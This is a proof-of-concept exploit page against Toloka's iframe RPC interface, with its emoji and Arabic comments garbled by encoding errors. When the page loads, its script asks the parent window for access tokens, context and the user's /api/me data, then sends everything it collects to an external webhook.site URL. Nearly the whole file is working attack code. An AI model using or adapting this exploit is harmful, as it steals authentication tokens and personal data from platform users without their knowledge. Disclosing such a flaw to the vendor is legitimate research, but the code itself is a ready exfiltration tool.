<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>üß™ PoC - Toloka RPC Leak</title>
  <style>
    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
    pre { white-space: pre-wrap; word-break: break-word; }
  </style>
</head>
<body>
  <h2>üì° Toloka RPC PoC</h2>
  <pre id="log">‚è≥ Running tests...</pre>

  <script>
    const logEl = document.getElementById('log');
    const webhookURL = 'https://webhook.site/2106b9ef-aafe-498c-b8e0-bef7c35b92f3'; // ‚Üê ÿ∂ÿπ ÿ±ÿßÿ®ÿ∑ŸÉ ŸáŸÜÿß

    const collected = {};

    const log = (...args) => {
      const text = args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : a).join(' ');
      logEl.textContent += '\n' + text;
      console.log(...args);
    };

    function callRPC(method, payload = {}) {
      const id = crypto.randomUUID();

      window.addEventListener('message', function handler(e) {
        if (e.origin !== 'https://tb.toloka.dev') return;
        if (e.data?.id === id && e.data?.type === 'rpc') {
          log(`‚úÖ [${method}] response:`, e.data.payload);
          collected[method] = e.data.payload;
          window.removeEventListener('message', handler);

          // ÿ•ÿ∞ÿß ÿ¨ŸÖÿπŸÜÿß ŸÉŸÑ ÿßŸÑŸÇŸäŸÖ ŸÜÿ±ÿ≥ŸÑŸáÿß ÿ•ŸÑŸâ Webhook
          if (Object.keys(collected).length === 4) {
            fetch(webhookURL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                time: new Date().toISOString(),
                data: collected
              })
            }).then(() => log('üì§ Sent to webhook ‚úÖ')).catch(e => log('‚ùå Webhook error:', e));
          }
        }
      });

      window.parent.postMessage({ type: 'rpc', id, name: method, payload }, '*');
      log(`üì§ Sent ${method} with id ${id}`);
    }

    window.onload = () => {
      ['getAccessToken', 'getToken', 'getContext'].forEach(callRPC);
      callRPC('fetch', {
        url: '/api/me',
        requestInit: { method: 'GET' }
      });
    };
  </script>
</body>
</html>
